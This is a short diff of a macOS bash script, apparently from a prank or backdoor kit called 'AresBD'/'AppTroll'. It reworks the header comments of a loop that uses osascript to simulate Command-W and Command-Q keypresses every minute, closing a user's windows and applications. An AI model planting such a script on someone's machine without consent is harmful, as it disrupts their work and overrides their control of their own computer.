@@ -1,9 +1,12 @@
 #!/bin/bash
-# © 2015 Stsosz and Ohnx. All Rights Reserved.
-# AresBD Command-Q Script by Ohnx and Stsosz
-# This simulates a Command-Q Keypress and 3 Command-W Keypresses every minute. 
-# Don't be an asshole. Don't use this without permission. I'm not responsible for
-# Any stupid stuff you do with AresBD. 
+
+#  AppTroll
+#  Command-Q
+#
+#  Copyright (c) 2015 Stsosz Systems and Ohnx. All rights reserved.
+#  Don't be an asshole. Don't use this without permission. I'm not responsible for
+#  Any stupid stuff you do with AresBD.
+#  This simulates a Command-Q Keypress and 3 Command-W Keypresses every minute.
 
 while true; do
 osascript -e 'tell application "System Events" to keystroke "w" using command down'
